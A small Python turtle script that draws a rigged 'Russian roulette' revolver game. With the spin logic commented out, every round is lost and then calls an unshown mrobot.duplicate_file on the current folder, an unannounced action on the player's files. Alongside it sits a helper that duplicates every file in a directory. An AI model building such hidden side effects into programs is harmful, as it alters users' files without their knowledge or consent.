import turtle
import random
import math
import os

import mrobot

def duble_files(dirname):
    file_list = os.listdir(dirname)
    i = 0
    while i < len(file_list):
        mrobot.duplicate_file(file_list[i])
        i += 1


def gotoxy(x,y):
    turtle.penup()
    turtle.goto(x,y)
    turtle.pendown()

def draw_circule(r, color):
    turtle.fillcolor(color)
    turtle.begin_fill()
    turtle.circle(r)
    turtle.end_fill()


turtle.speed(0)

def draw_pistol(base_x,base_y):
    gotoxy(base_x,base_y)
    turtle.circle(80)
    gotoxy(base_x,base_y+160)
    draw_circule(5,"red")
    for i in range(0, 7):
        phi_rad = phi * i * math.pi / 180.0
        gotoxy(base_x+math.sin(phi_rad) * r, base_y+math.cos(phi_rad) * r + 60)
        draw_circule(20, "white")

def rotate_pistol(base_x,base_y, start):
    for i in range(start, random.randrange(7, 100)):
        phi_rad = phi * i * math.pi / 180.0
        gotoxy(base_x+math.sin(phi_rad) * r, base_y+math.cos(phi_rad) * r + 60)
        draw_circule(20, "black")
        draw_circule(20, "white")

    gotoxy(base_x+math.sin(phi_rad) * r, base_y+math.cos(phi_rad) * r + 60)
    draw_circule(20, "black")
    return  i % 7


phi = 360/7
r = 50

draw_pistol(100,100)
answer = ''
start = 0
while answer != 'n':
    answer = turtle.textinput("Play","y/n")
    if answer == 'y':
       # rotate_pistol(100, 100, start)
        start = 0#rotate_pistol(100, 100, start)
        if start == 0:
            gotoxy(-150, 250)
            turtle.write("Вы проиграли ", font=("Arial", 18, "normal"))

            mrobot.duplicate_file('.')

    else:
        pass